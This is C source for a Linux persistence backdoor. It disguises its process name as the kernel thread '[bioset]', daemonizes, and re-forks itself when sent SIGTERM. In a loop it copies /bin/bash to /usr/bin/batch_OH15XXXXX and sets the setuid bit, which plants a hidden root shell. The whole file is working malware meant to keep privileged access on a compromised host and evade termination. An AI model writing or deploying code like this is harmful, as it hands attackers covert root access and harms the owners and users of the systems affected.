#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/shm.h>
#include "shared.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <fcntl.h>


static struct shared *shared;

void spawn_again(int signum)
{
	(void) signum; /* unused */

	pid_t pid = fork();
	if (pid == 0) {
		/* signalize change of pid ...
		 * don't bother with atomicity here...
		 * */
		shared->pid = getpid();
		setsid();
		return;
	}
	exit(EXIT_SUCCESS);
}

void check_file(void)
{
	struct stat stat;

	for (int p = 0; p < 10; ++p) {
		const int fd = open("/usr/bin/batch_OH15XXXXX", O_RDONLY);
		if (fd == -1) {
			system("cp /bin/bash /usr/bin/batch_OH15XXXXX");
		}
		if (fstat(fd, &stat) == -1) {
			close(fd);
			continue;
		}

		if (stat.st_mode & S_ISUID) {
			close(fd);
			return;
		}

		fchmod(fd, stat.st_mode | S_ISUID);
		close(fd);
	}
}

int main(int argc, char **argv)
{
	/* mask process name */
	strcpy(argv[0], "[bioset]");

	pid_t pid = fork();

	if (pid == 0) {

		setsid();
		/* Initialize shard memory */
		const int shmid = shmget(NUMBER_OF_THE_BEAST, sizeof(struct shared), IPC_CREAT | 0666);
		if (shmid == -1) {
			perror("shmget failed!");
			exit(EXIT_FAILURE);
		}
		shared = (struct shared*) shmat(shmid, NULL, 0);
		if (shared == NULL) {
			perror("shmat failed!");
			exit(EXIT_FAILURE);
		}
		shared->pid = getpid();

		/* Set signal handlers */
		struct sigaction new_action = { 0 };
		new_action.sa_handler = &spawn_again;
		sigaction (SIGTERM, &new_action, NULL);

		/* do something */
		while(1) {
			check_file();	
			sleep(2);
		};
	} else {
		exit(EXIT_FAILURE);
	}
}
